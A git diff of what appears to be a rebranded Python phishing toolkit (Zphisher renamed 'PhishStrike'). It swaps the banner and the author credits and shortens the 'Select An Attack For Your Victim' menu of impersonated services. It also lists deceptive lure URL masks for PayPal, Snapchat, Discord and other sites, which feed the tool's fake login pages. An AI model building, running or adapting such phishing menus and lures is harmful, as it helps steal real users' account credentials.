@@ -30,6 +30,7 @@ MEDIUM    = "\033[1;38;2;0;102;204m"   # Deep Azure (Bold)
 PURPLE    = "\033[1;38;2;157;0;255m"   # Neon Purple (Bold)
 DARK      = "\033[1;38;2;80;80;80m"     # Graphite (Bold)
 PINK      = "\033[1;38;2;255;45;170m"  # Neon Pink (Bold)
+RED       = "\033[1;38;2;255;50;50m"   # Cyber Red (Bold)
 RESET     = "\033[0m"
 WHITE     = "\033[1;97m"                # Pure White (Bold)
 BOLD      = "\033[1m"
@@ -120,21 +121,20 @@ def check_status():
 
 def banner():
     print(f"""{LIGHT1}  
-    {LIGHT2} ███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
-    {LIGHT2} ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
-    {LIGHT1}   ███╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
-    {LIGHT1}  ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
-    {MEDIUM} ███████╗██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
-    {MEDIUM} ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-    {PINK}                                          Version : {__version__}
+    {LIGHT2} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
+    {LIGHT2} ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
+    {LIGHT1} ██████╔╝███████║██║███████╗███████║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
+    {LIGHT1} ██╔═══╝ ██╔══██║██║╚════██║██╔══██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
+    {MEDIUM} ██║     ██║  ██║██║███████║██║  ██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
+    {MEDIUM} ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
     {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by htr-tech{RESET}""")
+    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by Farouq Shaheen & Lujain Ghatasheh{RESET}""")
 
 
 def banner_small():
     print(f"""
     {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {LIGHT2} \x5b {LIGHT1}Z P H I S H E R {LIGHT2} \x5d {PINK}v{__version__} {DARK}| {MEDIUM}PHISH STRIKE DASHBOARD
+    {LIGHT2} \x5b {LIGHT1}P H I S H S T R I K E {LIGHT2} \x5d {DARK}| {MEDIUM}PHISH STRIKE DASHBOARD
     {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 
@@ -266,20 +266,20 @@ def about():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     print(f"""
-{PURPLE} Author   {DARK}:  {LIGHT2}TAHMID RAYAT {DARK}[ {LIGHT2}HTR-TECH {DARK}]
-{PURPLE} Github   {DARK}:  {LIGHT2}https://github.com/htr-tech
-{PURPLE} Social   {DARK}:  {LIGHT2}https://tahmidrayat.is-a.dev
-{PURPLE} Version  {DARK}:  {LIGHT2}{__version__}
+{PURPLE} ╭───{LIGHT1} [ Farouq Shaheen ] {PURPLE}───────────────────────────────────────
+{PURPLE} │ {LIGHT2}Github {DARK}: {LIGHT1}https://github.com/farouqshaheen
+{PURPLE} │ {LIGHT2}Social {DARK}: {LIGHT1}https://www.linkedin.com/in/farouq-shaheen-667b24305/
+{PURPLE} ╰───────────────────────────────────────────────────────────
 
-{LIGHT1} {DARK}Warning:{RESET}
-{LIGHT2}  This Tool is made for educational purpose 
-  only {DARK}!{LIGHT1}{LIGHT2} Author will not be responsible for 
-  any misuse of this toolkit {DARK}!{LIGHT1}
+{PURPLE} ╭───{LIGHT1} [ Lujain Ghatasheh ] {PURPLE}─────────────────────────────────────
+{PURPLE} │ {LIGHT2}Github {DARK}: {LIGHT1}https://github.com/LujainGhatasheh
+{PURPLE} │ {LIGHT2}Social {DARK}: {LIGHT1}https://www.linkedin.com/in/lujain-ghatasheh-7a25a5344/
+{PURPLE} ╰───────────────────────────────────────────────────────────
 
-{LIGHT1} {PURPLE}Special Thanks to:{RESET}
-{PURPLE}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-  Yisus7u7
+{RED} Warning:{RESET}
+{RED}  This Tool is made for educational purpose 
+  only ! Authors will not be responsible for 
+  any misuse of this toolkit !{RESET}
 
 """)
     print(f"    {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Main Menu     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} Exit\n")
@@ -775,18 +775,11 @@ def main_menu():
     print(f"""
     {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2} Select An Attack For Your Victim {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2}
 
-    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Twitch       {DARK}\x5b{WHITE}21{DARK}\x5d{LIGHT2} DeviantArt
-    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Pinterest    {DARK}\x5b{WHITE}22{DARK}\x5d{LIGHT2} Badoo
-    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Snapchat     {DARK}\x5b{WHITE}23{DARK}\x5d{LIGHT2} Origin
-    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Linkedin     {DARK}\x5b{WHITE}24{DARK}\x5d{LIGHT2} DropBox	
-    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Ebay         {DARK}\x5b{WHITE}25{DARK}\x5d{LIGHT2} Yahoo		
-    {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}16{DARK}\x5d{LIGHT2} Quora        {DARK}\x5b{WHITE}26{DARK}\x5d{LIGHT2} Wordpress
-    {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Steam         {DARK}\x5b{WHITE}17{DARK}\x5d{LIGHT2} Protonmail   {DARK}\x5b{WHITE}27{DARK}\x5d{LIGHT2} Yandex			
-    {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Twitter       {DARK}\x5b{WHITE}18{DARK}\x5d{LIGHT2} Spotify      {DARK}\x5b{WHITE}28{DARK}\x5d{LIGHT2} StackoverFlow
-    {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Playstation   {DARK}\x5b{WHITE}19{DARK}\x5d{LIGHT2} Reddit       {DARK}\x5b{WHITE}29{DARK}\x5d{LIGHT2} Vk
-    {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Tiktok        {DARK}\x5b{WHITE}20{DARK}\x5d{LIGHT2} Adobe        {DARK}\x5b{WHITE}30{DARK}\x5d{LIGHT2} XBOX
-    {DARK}\x5b{WHITE}31{DARK}\x5d{LIGHT2} Mediafire     {DARK}\x5b{WHITE}32{DARK}\x5d{LIGHT2} Gitlab       {DARK}\x5b{WHITE}33{DARK}\x5d{LIGHT2} Github
-    {DARK}\x5b{WHITE}34{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}35{DARK}\x5d{LIGHT2} Roblox 
+    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Spotify
+    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Snapchat      {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Reddit
+    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Linkedin      {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Quora
+    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Adobe
+    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex
 
     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
     """)
@@ -799,40 +792,18 @@ def main_menu():
         "05": ("netflix", "https://upgrade-your-netflix-plan-free"),
         "6": ("paypal", "https://get-500-usd-free-to-your-acount"),
         "06": ("paypal", "https://get-500-usd-free-to-your-acount"),
-        "7": ("steam", "https://steam-500-usd-gift-card-free"),
-        "07": ("steam", "https://steam-500-usd-gift-card-free"),
-        "8": ("twitter", "https://get-blue-badge-on-twitter-free"),
-        "08": ("twitter", "https://get-blue-badge-on-twitter-free"),
-        "9": ("playstation", "https://playstation-500-usd-gift-card-free"),
-        "09": ("playstation", "https://playstation-500-usd-gift-card-free"),
-        "10": ("tiktok", "https://tiktok-free-liker"),
-        "11": ("twitch", "https://unlimited-twitch-tv-user-for-free"),
-        "12": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
-        "13": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
-        "14": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
-        "15": ("ebay", "https://get-500-usd-free-to-your-acount"),
-        "16": ("quora", "https://quora-premium-for-free"),
-        "17": ("protonmail", "https://protonmail-pro-basics-for-free"),
-        "18": ("spotify", "https://convert-your-account-to-spotify-premium"),
-        "19": ("reddit", "https://reddit-official-verified-member-badge"),
-        "20": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
-        "21": ("deviantart", "https://get-500-usd-free-to-your-acount"),
-        "22": ("badoo", "https://get-500-usd-free-to-your-acount"),
-        "23": ("origin", "https://get-500-usd-free-to-your-acount"),
-        "24": ("dropbox", "https://get-1TB-cloud-storage-free"),
-        "25": ("yahoo", "https://grab-mail-from-anyother-yahoo-account-free"),
-        "26": ("wordpress", "https://unlimited-wordpress-traffic-free"),
-        "27": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
-        "28": (
-            "stackoverflow",
-            "https://get-stackoverflow-lifetime-pro-membership-free",
-        ),
-        "30": ("xbox", "https://get-500-usd-free-to-your-acount"),
-        "31": ("mediafire", "https://get-1TB-on-mediafire-free"),
-        "32": ("gitlab", "https://get-1k-followers-on-gitlab-free"),
-        "33": ("github", "https://get-1k-followers-on-github-free"),
-        "34": ("discord", "https://get-discord-nitro-free"),
-        "35": ("roblox", "https://get-free-robux"),
+        "7": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
+        "07": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
+        "8": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
+        "08": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
+        "9": ("discord", "https://get-discord-nitro-free"),
+        "09": ("discord", "https://get-discord-nitro-free"),
+        "10": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
+        "11": ("spotify", "https://convert-your-account-to-spotify-premium"),
+        "12": ("reddit", "https://reddit-official-verified-member-badge"),
+        "13": ("quora", "https://quora-premium-for-free"),
+        "14": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
+        "15": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
     }
 
     if reply in ["1", "01"]:
@@ -841,8 +812,6 @@ def main_menu():
         site_instagram()
     elif reply in ["3", "03"]:
         site_gmail()
-    elif reply in ["29"]:
-        site_vk()
     elif reply in opts:
         website, mask = opts[reply]
         tunnel_menu()
